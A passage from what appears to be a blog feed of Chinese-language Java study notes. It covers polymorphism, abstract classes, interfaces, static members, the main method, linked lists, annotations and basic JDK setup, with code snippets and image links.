class-name">Animal</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Cat</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">class</span> <span class="token class-name">Dog</span> <span class="token keyword">extends</span> <span class="token class-name">Animal</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token class-name">Dog</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">super</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol><li>  如果动物很多，食物很多，会导致feed方法很多（<strong>重载很多方法</strong>），不利于管理和维护</li><li>  但是<strong>本质就是给某个动物喂某种食物</strong></li><li>  多态可以降低代码复用性</li></ol><h3 id="多态的基本介绍"><a href="#多态的基本介绍" class="headerlink" title="多态的基本介绍"></a>多态的基本介绍</h3><ol><li>  多：多种</li><li>  态：状态</li><li>  方法或对象具有多种形态，是面向对象的第三大特征</li><li>  多态是继承在封装和继承基础之上的</li></ol><h3 id="方法的多态"><a href="#方法的多态" class="headerlink" title="方法的多态"></a>方法的多态</h3><ol><li>  重写和重载就体现多态</li><li>  <strong>重载</strong>传入不同的参数，就会调用不同的方法，就体现了多态</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822234022.png"></li><li>  <strong>重写</strong>调用不同的对象，不同对象的方法为重写，体现了多态</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822234046.png"></li></ol><h3 id="对象的多态（核心）"><a href="#对象的多态（核心）" class="headerlink" title="对象的多态（核心）"></a>对象的多态（核心）</h3><h4 id="重要的几句话（背过）"><a href="#重要的几句话（背过）" class="headerlink" title="重要的几句话（背过）"></a>重要的几句话（背过）</h4><ol><li><p>一个对象的编译类型和运行类型可以不一致</p><p>  一个父类的引用可以指向一个子类的引用<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822234455.png"></p></li><li><p>  <strong>编译类型</strong>在定义对象时，就确定了，<strong>不能改变</strong></p></li><li><p><strong>运行类型是可以变化的</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220822235423.png"></p></li><li><p>  编译类型看定义时 = 的左边，运行类型看 = 的右边</p></li></ol><h3 id="体验对象多态的特点，编译类型和运行类型"><a href="#体验对象多态的特点，编译类型和运行类型" class="headerlink" title="体验对象多态的特点，编译类型和运行类型"></a>体验对象多态的特点，编译类型和运行类型</h3><ol><li><p>  编译时，javac，类型由声明该变量时使用的类型决定</p></li><li><p>  运行时，java，类型由实际赋给该变量的对象决定</p></li><li><p>```java<br>  Person p = new Women(); //Women继承自Person类</p>  <pre class="line-numbers language-none"><code class="language-none">4.   上面的p会得到Person类的属性，调用Women类的方法5.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220823001726.png)6.   可以理解为：编译类型决定了变量的属性，而运行类型决定了方法### 使用多态机制，可以统一的管理主人喂食的问题## 抽象方法### 处理问题：1.   处理的主要问题是：父类方法的不确定性问题2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220826211645.png)3.   考虑将该方法设计为抽象(abstract)方法4.   所谓抽象方法就是没有实现的方法，所谓没有实现，就是没有方法体5.   当遇到6.   &#96;&#96;&#96;java     Missing method body , or declare abstract<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  时，说明如果没有方法体，可以声明为一个抽象方法</p></li><li><p>  抽象方法只需要声明即可</p></li><li><p>```java<br>  public abstract void eat();<br>  限制范围 abstract 返回值类型 函数名();</p>  <pre class="line-numbers language-none"><code class="language-none">10.   将一个类做成抽象类，并让子类去具体实现，父类只是起到一个声明的作用11.   一般来说，抽象类会被继承，由其子类来继承### 抽象类细节1.   用abstract关键字来修饰一个类时，这个类就叫做抽象类2.   &#96;&#96;&#96;java     访问修饰符 abstract 类名&#123;     &#x2F;&#x2F;属性     &#x2F;&#x2F;方法     public abstract void eat()&#123;&#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  用<strong>abstract关键字</strong>来<strong>修饰一个方法</strong>时，这个方法就是<strong>抽象方法</strong>，</p></li><li><p>```java<br>  访问修饰符 abstract 返回类型 方法名(参数列表); //后面不能加方法体，否则会报abstract methods cannot have a body</p>  <pre class="line-numbers language-none"><code class="language-none">5.   抽象类的**价值更多作用在于设计**，是设计者设计好后，让**子类继承并实现**6.   后面的**接口**是很常见的抽象类调用7.   抽象类不能被实例化8.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220826212813.png)9.   **抽象类不一定要包含abstract方法**，也就是说，抽象类可以没有abstract方法。抽象类中还可以有实现的方法10.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220826213103.png)11.   **一旦一个类包含了abstract方法，则这个类必须声明为abstract**（但是一个abstract类中不一定包含abstract方法）12.   **抽象类可以有任意成员**  [抽象类的**本质还是类**]  ，比如:非抽象方法，构造器，静态属性等等13.   抽象方法不能有主体，即不能实现14.   如果**一个类继承了抽象类**，则它**必须实现抽象类的所有抽象方法**，**除非它自己也声明为abstract类**15.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220826214526.png)### abstract修饰的对象1.   abstract只能修饰类和方法2.   abstract不能修饰属性和其它，抽象的属性说不通3.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220826213451.png)## 接口interface### 快速入门1.   usb插槽就是现实的接口2.   不用担心哪个插槽是插哪个的，因为做usb插槽的厂家和做各种设备的厂家都遵守了统一的规定，包括尺寸，排线等等3.   程序就是一个世界### 实现思路1.   实现接口，就是把接口方法实现2.   接口方法就是一个标准，类似于USB2.0和USB3.0### 概念1.   **接口就是给出一些没有实现的方法**，封装到一起，到某个类**要使用的时候**，再根据**具体情况把这些方法写出来**2.   &#96;&#96;&#96;java     访问范围修饰符 interface 接口名&#123;     &#x2F;&#x2F;属性         &#x2F;&#x2F;方法，这个时候方法只有方法名，没有方法体的具体实现     &#125;     class 类名 implements 接口&#123;         &#x2F;&#x2F;自己属性         &#x2F;&#x2F;自己方法，这个时候可以根据具体情况加上类的调用         &#x2F;&#x2F;必须实现的接口的抽象方法     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  在接口中，抽象方法，可以省略abstract关键字</p></li><li><p>  implement关键字用来调用接口，生效，执行，实施</p></li><li><p>在jdk8后，可以有默认实现方法，需要使用default关键字修饰</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">default</span> <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ok</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>  在jdk7.0前，接口里所有方法都没有方法体，即都是抽象方法</p></li><li><p>  在jdk8.0以后，接口可以有静态方法，默认方法，也就是说接口中可以有方法的具体实现</p></li></ol><h3 id="接口的应用场景"><a href="#接口的应用场景" class="headerlink" title="接口的应用场景"></a>接口的应用场景</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220826191919.png"></li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220826192407.png"></li><li>  当不同的程序员在开发时，如果写了不同的方法，综合的人调用起来就会很麻烦</li><li>  所以接口的目的就是指定一个标准，接口只去定义后来的方法名，而不去定义具体方法</li><li>  根据接口写类的程序员根据接口，再去写具体的方法，但是方法名不会有区别</li><li>  最后，整合的程序员实例化对象，并且通过这个实例化出来的对象，调用这个对象的成员方法</li></ol><h3 id="接口的注意事项"><a href="#接口的注意事项" class="headerlink" title="接口的注意事项"></a>接口的注意事项</h3><ol><li>  接口不能被实例化，所以new interface_name是错误的</li><li>  接口中所有的方法都是public方法，所以可以不写public关键字，默认的就是public（目的就是能够让所有的编写类的程序员都能够访问到接口）</li><li>  接口中的抽象方法，可以不用abstract来修饰,下图可以看到，public和abstract都是灰色的，即可有可无的</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220826194855.png"></li><li>  一个普通类实现接口，就必须<strong>将该接口的所有方法都实现</strong>，可以使用alt+enter的快捷键去快捷调用所有接口中的方法</li><li>  因为在继承时，子类不能缩小父类的访问范围，所以因为接口（父类）访问范围是public,子类的访问范围也就是public,如果访问范围限制为default或更小，则会报错</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220826195734.png"></li><li>  抽象类实现接口，可以不用实现接口的方法</li></ol><h2 id="类变量"><a href="#类变量" class="headerlink" title="类变量"></a>类变量</h2><h3 id="待解决问题"><a href="#待解决问题" class="headerlink" title="待解决问题"></a>待解决问题</h3><ol><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828152901.png"></li></ol><h3 id="快速入门-2"><a href="#快速入门-2" class="headerlink" title="快速入门"></a>快速入门</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828153219.png"></p></li><li><p>  定义所有对象共享的变量即为类变量</p></li><li><p>```java<br>  类名.变量名 Child.count<br>  或者也可以<br>  实例化的对象.变量名 child1.count</p>  <pre class="line-numbers language-none"><code class="language-none">4.   可以**直接由类名访问**，因为是类变量5.   也可以由**实例化的对象进行类变量的访问**，因为这几个对象出自一个类，所以 这几个对象的变量是**共享的**6.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220828154057.png)### 什么是类变量1.   **类变量也叫静态变量，静态属性，是该类的所有对象共享的变量，任何一个该类的对象去访问它时，取到的值都是相同的值，同样，任何一个该类的对象去修改它时，修改的也是同一个变量**2.   &#96;&#96;&#96;java     访问修饰符 static 数据类型 变量名；<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  访问类变量：类名.类变量名   或者 对象名.类变量名</p></li><li><p>  类变量并不依赖于实例，类变量是随着类的加载而创建的，所以没有创建对象实例也可以访问</p></li><li><p>```java<br>  public class lei {</p><pre><code>  public static void main(String[] args)&#123;      //这个地方是通过 类名.变量名 去访问的，类变量      sta.a++;      System.out.print(sta.a);  &#125;</code></pre><p>  }</p><p>  class sta{</p><pre><code>  public static int a = 0;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">### 类变量使用细节#### 使用类变量的时候1.   在需要**这个类的所有对象都能访问**到这个变量的时候就需要使用类变量(共享一个变量)2.   ![](https:&#x2F;&#x2F;strongwillpro.oss-cn-beijing.aliyuncs.com&#x2F;img&#x2F;20220828160025.png)#### 类变量和实例变量的区别1.   类变量是该类的**所有对象共享的**，而实例变量是**某个对象独享的**2.   实例对象如果没有实例化则不能访问3.   类变量如果没有实例化仍可以访问#### 加上static称为类变量或者静态变量，否则称为实例变量、普通变量、非静态变量#### 推荐使用  类名.类变量名  来访问### 类变量的生命周期1.   类变量的声明周期是**随着类的加载开始，随着类的消亡而毁灭**2.   只要类没有消亡，类变量就不会消亡## 类方法### 静态方法1.   &#96;&#96;&#96;java     访问修饰符 static 数据返回类型 方法名()&#123;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>  当方法使用了static修饰后，该方法就是静态方法</p></li><li><p>  静态方法就可以访问静态属性/变量</p></li></ol><h2 id="main方法语法"><a href="#main方法语法" class="headerlink" title="main方法语法"></a>main方法语法</h2><h3 id="解释main方法的形式"><a href="#解释main方法的形式" class="headerlink" title="解释main方法的形式"></a>解释main方法的形式</h3><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="重点"><a href="#重点" class="headerlink" title="重点"></a>重点</h3><ol><li>  <strong>main方法是jvm虚拟机调用</strong></li><li>  <strong>java虚拟机在执行main()方法时，不必创建对象</strong>，（类似于类方法，可以让这个类的所有对象都能访问到，共享），<strong>所以该方法必须是static</strong>，即在<strong>调用主类的main方法时，是没有必要去实例化这个主类的</strong>，只需要调用main方法（也没有见过实例化主类，为了调用main方法）</li><li>  <strong>java虚拟机需要调用类的main方法</strong>，所以该方法的<strong>访问权限必须是public</strong></li><li>  该方法<strong>接收String类型的数组参数</strong>，该数组中<strong>保存执行java命令时传递给所运行的类的参数</strong></li><li>  可以对main函数中的args取下标，来获取到main函数的参数的具体的值</li><li>  实际是<strong>将main函数的参数打包成一个字符串</strong>，然后<strong>传给main函数</strong></li><li>  java 执行的程序 参数1 参数2 参数3</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828205929.png"></li></ol><h3 id="main的特别说明"><a href="#main的特别说明" class="headerlink" title="main的特别说明"></a>main的特别说明</h3><ol><li>  在main方法中，可以<strong>直接调用main方法所在的类的静态方法或静态属性</strong></li><li>  但是，不能直接访问该类中的非静态成员，必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</li><li>  静态方法，可以访问本类的静态成员</li><li>  静态方法，不可以访问本类的非静态成员（static的类，不能访问非static的成员变量，即不能访问非static的属性和方法）</li><li>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828211007.png"></li><li>  如果想要访问非静态成员，则必须创建该类的一个实例对象后，才能通过这个对象去访问类中的非静态成员</li><li>  静态方法main，要访问本类的非静态成员，需要先创建对象，再调用即可</li><li>  如果main方法和要调用的非静态成员在一个类中，则需要将这个main方法和非静态成员共存的class实例化</li><li>  实例化前：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828211742.png"></li><li>  后：<img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220828211827.png"></li><li>  访问方法和调用成员方法相同，使用 <strong>.</strong> 去访问</li></ol><h2 id="java数据结构"><a href="#java数据结构" class="headerlink" title="java数据结构"></a>java数据结构</h2><h3 id="链表的实现"><a href="#链表的实现" class="headerlink" title="链表的实现"></a>链表的实现</h3><ol><li><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220829221841.png"></p></li><li><p>  java ListNode链表是用Java自定义实现的链表结构</p></li><li><p>```java<br>  class ListNode{</p><pre><code>  int val;  ListNode next;</code></pre><p>  }</p>  <pre class="line-numbers language-none"><code class="language-none">4.   添加构造方法，方便初始化     &#96;&#96;&#96;java     class ListNode&#123;     int val;     ListNode next;     ListNode(int val)&#123;     this.val &#x3D; val;     &#125;     &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>删除一个节点</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/** * Definition for singly-linked list. * public class ListNode &#123; *     int val; *     ListNode next; *     ListNode(int x) &#123; val = x; &#125; * &#125; */</span><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">deleteNode</span><span class="token punctuation">(</span><span class="token class-name">ListNode</span> node<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">ListNode</span> p <span class="token operator">=</span> node<span class="token punctuation">.</span>next<span class="token punctuation">;</span>        node<span class="token punctuation">.</span>val <span class="token operator">=</span> p<span class="token punctuation">.</span>val<span class="token punctuation">;</span>        node<span class="token punctuation">.</span>next <span class="token operator">=</span> p<span class="token punctuation">.</span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="Java注解"><a href="#Java注解" class="headerlink" title="Java注解"></a>Java注解</h2><ol><li>  @Override 告诉编辑器这个方法是覆盖父类的方法，在子类继承父类的时候用到，<strong>重写</strong>的时候用到</li><li>  @WebServlet(“/test”) 表示这个类是一个Servlet,Web容器就会识别这个注解，在运行的时候调用它，涉及到在使用tomcat就会调用它</li><li>  @Controller(“/test”) 表示某个类是一个控制器，告诉Spring框架该类是一个控制器</li></ol><h3 id="注解和注释"><a href="#注解和注释" class="headerlink" title="注解和注释"></a>注解和注释</h3><ol><li>  注释和注解不同，注解会影响程序的运行，而注释编译器则不会对其操作</li><li>  注释是给开发人员看的，<strong>注解不是给人看的，是用于给程序看的</strong>，会影响程序的编译和运行，编辑器，框架，tomcat</li></ol><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><ol><li>  自定义开发一个Web容器，基本功能是加载Servlet，需要管理它的生命周期，所以必须先识别程序中的哪些类是Servlet</li><li>  程序启动的时候，扫描所有的类，找出添加了@WebServlet注解的类，进行加载</li><li>  @WebServlet是在程序运行的时候起作用的，Java就把它的作用范围规定为RUNTIME</li><li>  @Override是给编译器看的，编译器工作的时候识别出了包含@Override注解的方法，就去检查上层父类的相关方法，存在则通过，否则报错</li></ol><h3 id="开发常用"><a href="#开发常用" class="headerlink" title="开发常用"></a>开发常用</h3><h4 id="RequestMapping"><a href="#RequestMapping" class="headerlink" title="@RequestMapping"></a>@RequestMapping</h4><ol><li><p>  @RequestMapping可以将HTTP请求映射到某个类中的方法</p></li><li><pre><code class="java">  @RequestMapping(value = &quot;/ex/foos&quot;, method = RequestMethod.GET)  @ResponseBody  public String getFoosBySimplePath() &#123;      return &quot;Get some Foos&quot;;  &#125;  //value值写路径，method写方法</code></pre></li><li><p>  详细参数看<a href="https://blog.csdn.net/J080624/article/details/55193269">(100条消息) SpringMVC-@RequestMapping的参数和用法_流烟默的博客-CSDN博客_@requestmapping</a></p></li><li><p>  最重要的参数：value=”url”,method= RequestMethod.POST/RequestMethod.GET</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
          <category> ing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ing </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java</title>
      <link href="/Java/"/>
      <url>/Java/</url>
      
        <content type="html"><![CDATA[<h1 id="Java基本语法"><a href="#Java基本语法" class="headerlink" title="Java基本语法"></a>Java基本语法</h1><h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><ol><li><p>  面向对象 oop</p></li><li><p>  健壮，强类型机制</p></li><li><p>跨平台，即可以跨系统运行class文件，windows和Linux都可以</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809115014.png"></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20240115225650.png"></p></li><li><p>Java语言是解释性的，JavaScript，PHP，java是解释性，编译性语言是c，c++</p><p>  解释性语言，编译后的代码不能直接被机器执行，需要解释器来执行</p><p>  编译性语言，编译后的代码可以直接被机器执行，编译后的是二进制文件，所以可以直接执行</p></li></ol><h2 id="Java的运行机制"><a href="#Java的运行机制" class="headerlink" title="Java的运行机制"></a>Java的运行机制</h2><ol><li><p>  先编写.java文件</p></li><li><p>  编译为.class文件</p></li><li><p>JVM，java虚拟机，因为有了JVM，同一个Java程序在三个不同的操作系统中都可以执行</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809115824.png"></p></li></ol><h2 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h2><ol><li><p>  java development kit Java开发工具包</p></li><li><p>  JDK=JRE + Java的开发工具[java,javac,javadoc,javap等]</p></li><li><p>  <strong>jdk包含了jre，jre包含了jvm</strong>,<strong>所以安装了JDK，就不用安装JRE了</strong></p></li><li><p>但是<strong>从jdk9开始，jdk目录中就没有单独的jre目录了</strong>，因为jre作为一个运行时，里面不需要包含太多的东西浪费空间，降低运行效率，再<strong>jdk9的时候使用模块化技术</strong>，<strong>让开发者能按照自己的应用创建一个最小的运行时jre</strong>（比如一个微服务的部署，仅仅需要一个非常小的runtime，而不是像之前一样不管应用复杂还是简单，都需要一个近百M的jre运行），这样提高了运行效率</p>  <pre class="line-numbers language-none"><code class="language-none">javac 编译工具java 运行工具jdb 调试工具jhat 内存分析工具<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="JRE"><a href="#JRE" class="headerlink" title="JRE"></a>JRE</h2><ol><li>  JRE = JVM + Java的核心类库</li><li>  java runtime environment Java运行环境</li><li>  包括JVM和Java程序所需要的核心类库等，如果想要运行一个开发好的Java程序，计算机中只需要安装JRE</li></ol><h2 id="java快速入门"><a href="#java快速入门" class="headerlink" title="java快速入门"></a>java快速入门</h2><pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">&#x2F;&#x2F; 这是java快速入门public class hello&#123;    &#x2F;&#x2F;编写一个main方法    public static void main(string[] args)&#123;        System.out.println(&quot;hello,world~&quot;)    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>表示hello是一个类，是public公有的类，<strong>这个类的名字要和文件名相同</strong></p><ol><li><p>  大括号表示一个类的开始和结束，hello{}表示一个类的开始和结束</p></li><li><p>  <strong>public static void main()表示是一个主方法</strong>，即我们程序的入口</p></li><li><p>  main(){…}大括号表示方法的开始和结束</p></li><li><p>  System.out.println(“hello world<del>“);表示输出”hello,world</del>“到屏幕</p></li><li><p>  分号**;**代表语句的结束</p></li><li><p>如果程序class后的变量和文件名不一致，会报错“错误: 类HelloWorld是公共的, 应在名为 HelloWorld.java 的文件中声明”，这个时候，我们需要将文件名和类名相同</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809134557.png"></p></li></ol><h2 id="编码问题"><a href="#编码问题" class="headerlink" title="编码问题"></a>编码问题</h2><ol><li><p>  出现乱码编译不过去，<strong>javac编译之后没有.class文件</strong>的原因可能就是编码问题</p></li><li><p>win+r打开terminal,右键点击属性，可以查看到编码（当前代码页那一栏）</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809133715.png"></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809133644.png"></p></li><li><p>  因为当前控制台设置的编码是gbk，所以只认gbk，其它的编码无法识别，即无法过编译</p></li><li><p>  所以在vscode中ctrl+shift+p,打开控制台，编码，选择编码重新打开，使用和terminal一样的编码打开，（可以都用gbk）</p></li></ol><h2 id="运行问题"><a href="#运行问题" class="headerlink" title="运行问题"></a>运行问题</h2><ol><li><p>  用<strong>javac</strong> 加上文件名可以<strong>编译</strong></p></li><li><p>  <strong>java 加上类的名字可以运行</strong></p></li><li><p>  注意，在<strong>运行的时候不能加.class</strong>,因为开发者写底层代码的时候，实际运行的是某个类，而不是某个文件</p></li><li><p><strong>如果想要类名和文件名不一致，必须在声明类时不带public</strong>，例如：</p>  <pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span> <span class="token operator">-></span> <span class="token keyword">class</span> <span class="token class-name">Demo</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  <strong>一个java文件中可以写多个class类</strong>，<strong>但是只能有一个类带public</strong>,有多少类就会生成多少class文件</p></li><li><p><strong>main方法必须写在带public的类中</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809134508.png"></p></li></ol><h2 id="Java执行流程分析"><a href="#Java执行流程分析" class="headerlink" title="Java执行流程分析"></a>Java执行流程分析</h2><ol><li>  编写.java文件(<strong>源文件</strong>)</li><li>  用javac命令将上一步编写的.java文件编译为.class文件（<strong>字节码文件</strong>）（javac命令的本质就是调用javac.exe）</li><li>  用java命令运行出结果，运行的本质就是将.class文件装载到jvm虚拟机中执行</li><li>  每一次更改之后必须重新编译，将jvm中的.class文件进行更新，才能真正地输出更新之后的结果，否则只保存，不会更新</li></ol><h2 id="Java开发细节"><a href="#Java开发细节" class="headerlink" title="Java开发细节"></a>Java开发细节</h2><ol><li><p>  Java源文件以.java为拓展名，源文件的基本组成部分是类(class)，例如本类中的Hello类</p></li><li><p>Java应用程序的执行入口是main()方法，有固定的书写格式</p>  <pre class="line-numbers language-Java" data-language="Java"><code class="language-Java">public static void main(String[] args)&#123;...&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>  Java<strong>严格区分大小写</strong></p></li><li><p>  Java每一条语句都是以<strong>分号</strong>结尾</p></li><li><p>  大括号都是成对出现的，缺一不可，<strong>习惯先写{}再写代码</strong></p></li><li><p>  <strong>一个源文件最多只能有一个public类</strong>，其它类的个数不限，例如我只能写一个public类，然后写多个前面没有限制的类</p></li><li><p>  编译后，<strong>每一个类，都对应一个.class文件</strong></p></li><li><p>  如果源文件包含一个public类，<strong>则文件名必须按照该类名命名</strong>，<strong>类的名字决定了文件名</strong></p></li><li><p>  一个源文件最多只能有一个public类，<strong>其它类的个数不限</strong>，也可以将main方法卸载非public类中，然后指定运行非public类，这样入口方法就是非public的main方法，而且<strong>一个源文件中可以包含多个main方法</strong>，即可以在public类中写完main后，在其它类中接着写main方法</p></li><li><p>  因为javac编译后是一个个的.class文件，调用时是单个进行调用，所以调用时，需要使用 java + 类名 进行逐个调用</p></li><li><p>  <strong>类、方法的注释，要以javadoc的方式来写</strong></p></li><li><p>  非javadoc的注释，往往是给代码的维护者看的，着重告诉读者为什么这样写，如何修改，注意什么问题</p></li><li><p>  码风缩进问题：<strong>选中后，按tab键整体右移，选中后，按shift+tab整体左移</strong></p></li><li><p>  码风书写问题：<strong>运算符和 = 两边各习惯性地加一个空格</strong>，比如 2 + 4 * 5 + 345 - 89</p></li><li><p>  <strong>源文件使用utf-8编码</strong>，用gbk是用dos不得已使用，所以<strong>以后开发使用utf-8编码</strong></p></li><li><p>  <strong>行宽不要超过80个字符</strong>，每一行不要超过80个字符</p></li><li><p>代码编写<strong>次行风格</strong>和<strong>行尾风格</strong></p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809222441.png"></p></li></ol><h2 id="学习方法"><a href="#学习方法" class="headerlink" title="学习方法"></a>学习方法</h2><ol><li><p>  按需学习</p></li><li><p>  先看看学过的传统技术能不能解决，新技术和传统技术进行比较，能解决但是不完美还是不能解决</p></li><li><p>  引出我们学习的新技术和知识点</p></li><li><p>  学习新技术或者知识点的基本原理和基本语法，不要在一开始就考虑细节</p></li><li><p>  快速入门（基本程序，增删改查）</p></li><li><p>开始考虑研究技术的注意事项，使用细节，使用规范，如何优化，研究框架之类的放到最后</p><p>  <img src="https://strongwillpro.oss-cn-beijing.aliyuncs.com/img/20220809155924.png"></p></li></ol><h2 id="Java转义字符"><a href="#Java转义字符" class="headerlink" title="Java转义字符"></a>Java转义字符</h2><pre class="line-numbers language-java" data-language="java"><code class="language-java">\t 制表符\n 换行，注意和\r的区别\\ 一个\\<span class="token string">" 一个"</span>\<span class="token string">' 一个'</span>\r 将光标跳转到该行开头，reverse，只是回车，没有换行，而且不是删除该行后，是替换前面的字符，而不是删除<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="初学Java易犯错误"><a href="#初学Java易犯错误" class="headerlink" 